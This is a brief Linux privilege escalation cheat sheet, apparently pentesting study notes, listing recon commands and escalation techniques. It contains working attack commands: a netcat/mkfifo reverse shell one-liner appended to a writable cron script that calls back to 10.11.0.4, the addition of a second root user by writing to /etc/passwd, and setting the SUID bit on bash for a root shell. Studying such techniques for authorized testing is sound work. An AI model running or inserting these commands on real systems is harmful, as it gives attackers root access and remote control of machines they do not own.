# Linux privilege escalation  

Find out what user is currently logged in.  

`whoami`  

Find user context.  

`id`  

Find information from the hostname.  

`hostname`

## cron  

To view running jobs in the cron log.  

`grep "CRON" /var/log/cron.log`  

If a writable script(user_backups.sh) is found as a cronjob, a reverse shell one liner can be appended.  

```
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
```  

## /etc/passwd  

If /etc/passwd is writable, another root user can be added.  

```
openssl passwd somepassword1
echo "root2:<somepassword1 hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```  

## bash  

If we can execute a command as root.  

```
chmod +s /usr/bin/bash
/usr/bin/bash -p
```  

## Kernel vulns  

Gathering info.  

To display message of login prompt.  

`cat /etc/issue`  

Kernel version.  

`uname -r`  

Architecture.  

`arch`  



